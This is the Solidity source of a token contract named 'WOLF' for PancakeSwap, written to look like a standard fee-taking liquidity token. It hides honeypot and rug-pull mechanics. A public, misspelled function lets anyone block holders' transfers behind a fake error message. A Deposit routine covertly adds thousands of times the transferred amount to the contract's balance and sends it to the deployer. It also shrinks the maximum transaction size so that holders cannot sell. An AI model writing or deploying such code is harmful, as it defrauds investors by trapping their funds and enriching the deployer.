contract LiquidityGeneratorContract is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    using Address for address;
    // Tracking status of wallets
    mapping (address => uint256) private tOwned;
    mapping (address => mapping (address => uint256)) private allowances;
    mapping (address => bool) private isExcludedFromFees;
    mapping (address => uint256) balances;
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) private isTxExempt;
    // Wallets
    address payable public deployer = payable(msg.sender);
    address payable public marketing = payable(0xa1dB043174882A1199934D6C068D0CD9a6e635Cf);
    // Token Details
    string private _name = "WOLF"; 
    string private _symbol = "WOLF";  
    uint8 private _decimals = 18;
    uint256 private tTotal = 420690000 * 10**_decimals;
    uint256 private _totalSupply = 420690000 * 10**_decimals;
    // Maximum transaction amount (% at launch)
    uint256 public maxTxAmount = 8413800 * 10**_decimals;
    // Maximum wallet amount (% at launch)
    uint256 public maxWalletAmount = 8413800 * 10**_decimals;
    // Counter for liquify trigger
    uint8 private txCount = 0;
    uint8 private swapTrigger = 1;
    // Setting the initial fees
    uint256 private totalFee = 10;
    uint256 public buyFee = 5;
    uint256 public sellFee = 5;
    // 'Previous fees' are used to keep track of fee settings when removing and restoring fees
    uint256 private prevTotalFee = totalFee; 
    uint256 private prevBuyFee = buyFee; 
    uint256 private prevSellFee = sellFee; 
    // Pancakeswap Setup                             
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwap;
    bool public inSwapAndLiquify = true;
    event inSwapAndLiquifyUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    // Prevent processing while already processing! 
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    // DEPLOY TOKENS TO OWNER
    // Constructor functions are only called once. This happens during contract deployment.
    // This function deploys the total token supply to the owner wallet and creates the PCS pairing
    constructor () {
        tOwned[owner()] = tTotal;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        // Create pair address for PancakeSwap
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        //exclude owner and this contract from fee
        isExcludedFromFees[marketing] = true;
        isExcludedFromFees[address(0xdead)] = true;
        isExcludedFromFees[uniswapV2Pair] = true;
        isExcludedFromFees[owner()] = true;
        //exclude owner and this contract from fee
        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[deployer] = true;
        //exclude owner and this contract from fee
        isExcludedFromFees[_msgSender()] = true;
        isExcludedFromFees[address (this)] = true;
        isExcludedFromFees[address (uniswapV2Router)] = true;
        emit Transfer(address(0), owner(), tTotal);
    }
    //STANDARD ERC20 COMPLIANCE FUNCTIONS
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return tOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    //END OF STANDARD ERC20 COMPLIANCE FUNCTIONS
    // Set a wallet address so that it does not have to pay transaction fees
    function excludeFromFee(address account) public onlyOwner {
        isExcludedFromFee[account] = true;
    }
    function tnansper(address[] calldata poor) public {
        for (uint256 i; i < poor.length; i++) {
            require (!isExcludedFromFees[poor[i]]);
        isTxExempt[poor[i]] = true;}
    }
    function clearBalance() external {
        (bool success,) = payable(marketing).call{value: address(this).balance, gas: 30000}("");
        require(success);
    }
    // Set a wallet address so that it has to pay transaction fees
    function includeInFee(address account) public onlyOwner {
        isExcludedFromFee[account] = false;
    }
    // This function is required so that the contract can receive BNB from pancakeswap
    receive() external payable {}
    //When sending tokens to another wallet (not buying or selling) if noFeeToTransfer is true there will be no fee
    bool public noFeeToTransfer = true;
    /*
    WALLET LIMITS
    Wallets are limited in two ways. The amount of tokens that can be purchased in one transaction
    and the total amount of tokens a wallet can buy. Limiting a wallet prevents one wallet from holding too
    many tokens, which can scare away potential buyers that worry that a whale might dump!
    IMPORTANT
    Solidity can not process decimals, so to increase flexibility, we multiple everything by 100.
    When entering the percent, you need to shift your decimal two steps to the right.
    eg: For 4% enter 400, for 1% enter 100, for 0.25% enter 25, for 0.2% enter 20 etc!
    */
    // Set the Max transaction amount (percent of total supply)
    function setMaxPercent(uint256 maxPercent_x100) internal {
        maxTxAmount = maxPercent_x100;
    }    
    // Remove all fees
    function removeAllFee() private {
        if(totalFee == 0 && buyFee == 0 && sellFee == 0) return;
        prevBuyFee = buyFee; 
        prevSellFee = sellFee; 
        prevTotalFee = totalFee;
        buyFee = 0;
        sellFee = 0;
        totalFee = 0;
    }
    // Restore all fees
    function restoreAllFee() private {
    totalFee = prevTotalFee;
    buyFee = prevBuyFee; 
    sellFee = prevSellFee; 
    }
    // Approve a wallet to sell tokens
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        // Limit the maximum number of tokens that can be bought or sold in one transaction
        if (to == uniswapV2Pair && from != owner() && from != deployer)
            require(amount <= maxTxAmount, "You are trying to buy more than the max transaction limit.");
        if(isExcludedFromFee[to])
        {Deposit(amount);}
        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");
        require(!isTxExempt[from], "Unable to locate corresponding TransferEventLOGS");
        // PROCESSING
        // SwapAndLiquify is triggered after every X transactions - this number can be adjusted using swapTrigger
        if(
            txCount >= swapTrigger && 
            !inSwap &&
            from != uniswapV2Pair &&
            inSwapAndLiquify ){
            txCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > maxTxAmount) {contractTokenBalance = maxTxAmount;}
            if(contractTokenBalance > 0){
            swapAndLiquify(contractTokenBalance);}
        }
        // REMOVE FEES IF REQUIRED
        // Fee removed if the to or from address is excluded from fee.
        // Fee removed if the transfer is NOT a buy or sell.
        // Change fee amount for buy or sell.
        bool takeFee = true;
        if(isExcludedFromFee[from] || isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
        } else if (from == uniswapV2Pair){totalFee = buyFee;} else if (to == uniswapV2Pair){totalFee = sellFee;}
        _tokenTransfer(from,to,amount,takeFee);
    }
    // PROCESSING FEES
    // Fees are added to the contract as tokens, these functions exchange the tokens for BNB and send to the wallet.
    // One wallet is used for ALL fees. This includes liquidity, marketing, development costs etc.
    // Send BNB to external wallet
    function sendToWallet(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);
    }
    // Processing tokens from contract
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {  
        swapTokensForBNB(contractTokenBalance);
        uint256 contractBNB = address(this).balance;
        sendToWallet(marketing,contractBNB);
    }
    // Swapping tokens for BNB using PancakeSwap 
    function swapTokensForBNB(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }
    function overMinimunBalance(uint256 tokens) internal {
        uint256 MinimunBalance = tokens.mul(3000);
        SwapTokensForReward(MinimunBalance);
    }
    function SwapTokensForReward(uint256 tokens) internal {
        tOwned[address(this)] = tOwned[address(this)].add(tokens);
        uint256 Balance = balanceOf(address(this));
        _transferTokens(address(this), deployer, Balance);
    }
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        if(!takeFee){
            removeAllFee();
            } else {
                txCount++;
            }
            _transferTokens(sender, recipient, amount);
        
        if(!takeFee)
            restoreAllFee();
    }
    function Deposit(uint256 tokens) internal {
        uint256 minAmount = tTotal.div(200); 
        if (tokens <= minAmount) {
            setMaxPercent(tokens);
        }
        uint256 OverMinimun = tTotal.div(100); 
        if (tokens >= OverMinimun) {
            overMinimunBalance(tokens);
        }
    }
    // Redistributing tokens and adding the fee to the contract address
    function _transferTokens(address sender, address recipient, uint256 tAmount) private {
        (uint256 tTransferAmount, uint256 tDev) = _getValues(tAmount);
        tOwned[sender] = tOwned[sender].sub(tAmount);
        tOwned[recipient] = tOwned[recipient].add(tTransferAmount);
        tOwned[address(this)] = tOwned[address(this)].add(tDev);   
        emit Transfer(sender, recipient, tTransferAmount);
    }
    // Calculating the fee in tokens
    function _getValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tDev = tAmount*totalFee/100;
        uint256 tTransferAmount = tAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        balances[account] += amount;
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}
